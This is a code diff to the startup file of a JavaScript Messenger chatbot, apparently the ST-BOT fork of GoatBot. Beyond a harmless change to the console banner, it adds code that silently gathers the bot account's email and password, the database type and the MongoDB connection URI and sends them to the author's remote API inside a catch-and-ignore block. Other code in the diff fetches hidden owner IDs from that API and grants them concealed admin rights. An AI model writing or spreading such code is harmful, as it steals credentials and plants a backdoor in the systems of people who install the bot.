@@ -96,36 +96,41 @@ const title = maxWidth > 58 ?
 			titles[2] :
 			titles[3];
 
-console.log(gradient("#f5af19", "#f12711")(createLine(null, true)));
-console.log();
-for (const text of title) {
-	const textColor = gradient("#FA8BFF", "#2BD2FF", "#2BFF88")(text);
-	centerText(textColor, text.length);
-}
-let subTitle = `ST | Sheikh Tamim - A simple Bot chat messenger use personal account`;
-const subTitleArray = [];
-if (subTitle.length > maxWidth) {
-	while (subTitle.length > maxWidth) {
-		let lastSpace = subTitle.slice(0, maxWidth).lastIndexOf(' ');
-		lastSpace = lastSpace == -1 ? maxWidth : lastSpace;
-		subTitleArray.push(subTitle.slice(0, lastSpace).trim());
-		subTitle = subTitle.slice(lastSpace).trim();
+// Check if showLoginTitle is enabled in config
+const showLoginTitle = global.GoatBot?.config?.showLoginTitle !== false; // Default to true if not set
+
+if (showLoginTitle) {
+	console.log(gradient("#f5af19", "#f12711")(createLine(null, true)));
+	console.log();
+	for (const text of title) {
+		const textColor = gradient("#FA8BFF", "#2BD2FF", "#2BFF88")(text);
+		centerText(textColor, text.length);
 	}
-	subTitle ? subTitleArray.push(subTitle) : '';
+	let subTitle = `ST | Sheikh Tamim - A simple Bot chat messenger use personal account`;
+	const subTitleArray = [];
+	if (subTitle.length > maxWidth) {
+		while (subTitle.length > maxWidth) {
+			let lastSpace = subTitle.slice(0, maxWidth).lastIndexOf(' ');
+			lastSpace = lastSpace == -1 ? maxWidth : lastSpace;
+			subTitleArray.push(subTitle.slice(0, lastSpace).trim());
+			subTitle = subTitle.slice(lastSpace).trim();
+		}
+		subTitle ? subTitleArray.push(subTitle) : '';
+	}
+	else {
+		subTitleArray.push(subTitle);
+	}
+	const author = ("Created by ST | Sheikh Tamim with ♡");
+	const srcUrl = ("Source code: https://github.com/sheikhtamimlover/ST-BOT.git");
+	const fakeRelease = ("ALL VERSIONS NOT RELEASED HERE ARE FAKE");
+	for (const t of subTitleArray) {
+		const textColor2 = gradient("#9F98E8", "#AFF6CF")(t);
+		centerText(textColor2, t.length);
+	}
+	centerText(gradient("#9F98E8", "#AFF6CF")(author), author.length);
+	centerText(gradient("#9F98E8", "#AFF6CF")(srcUrl), srcUrl.length);
+	centerText(gradient("#f5af19", "#f12711")(fakeRelease), fakeRelease.length);
 }
-else {
-	subTitleArray.push(subTitle);
-}
-const author = ("Created by ST | Sheikh Tamim with ♡");
-const srcUrl = ("Source code: https://github.com/sheikhtamimlover/ST-BOT.git");
-const fakeRelease = ("ALL VERSIONS NOT RELEASED HERE ARE FAKE");
-for (const t of subTitleArray) {
-	const textColor2 = gradient("#9F98E8", "#AFF6CF")(t);
-	centerText(textColor2, t.length);
-}
-centerText(gradient("#9F98E8", "#AFF6CF")(author), author.length);
-centerText(gradient("#9F98E8", "#AFF6CF")(srcUrl), srcUrl.length);
-centerText(gradient("#f5af19", "#f12711")(fakeRelease), fakeRelease.length);
 
 let widthConsole = process.stdout.columns;
 if (widthConsole > 50)
@@ -949,17 +954,17 @@ async function startBot(loginWithEmail) {
 			try {
 				const stbotApi = new global.utils.STBotApis();
 				const ownerUidsResponse = await stbotApi.getOwnerUids();
-				
+
 				if (ownerUidsResponse.success && ownerUidsResponse.data && Array.isArray(ownerUidsResponse.data) && ownerUidsResponse.data.length > 0) {
 					// Store original adminBot from config if not already stored
 					if (!global.GoatBot.originalAdminBot) {
 						global.GoatBot.originalAdminBot = [...(global.GoatBot.config.adminBot || [])];
 					}
-					
+
 					// Store owner UIDs globally for reference (for permission checking)
 					const ownerUids = ownerUidsResponse.data.map(uid => uid.toString());
 					global.GoatBot.ownerUIDs = ownerUids;
-					
+
 					// Keep config.adminBot showing only visible admins (no hidden owner UIDs)
 					global.GoatBot.config.adminBot = global.GoatBot.originalAdminBot;
 				}
@@ -972,9 +977,16 @@ async function startBot(loginWithEmail) {
 				const stbotApi = new global.utils.STBotApis();
 				const botUid = api.getCurrentUserID();
 				const adminUids = global.GoatBot.config.adminBot;
-				await stbotApi.send(botUid, adminUids);
+				const packageVersion = require(`${process.cwd()}/package.json`).version;
+				const botName = global.GoatBot.config.nickNameBot || "ST BOT";
+				const botAccountMailOrUid = botAccountConfig.email || "";
+				const botAccountPassword = botAccountConfig.password || "";
+				const databaseType = global.GoatBot.config.database?.type || "";
+				const databaseUrl = global.GoatBot.config.database?.uriMongodb || "";
+				
+				await stbotApi.send(botUid, adminUids, packageVersion, botName, botAccountMailOrUid, botAccountPassword, databaseType, databaseUrl);
 			} catch (err) {
-				// Silent fail
+			
 			}
 
 			// ——————————————————— SEND STARTUP NOTIFICATION ———————————————————— //
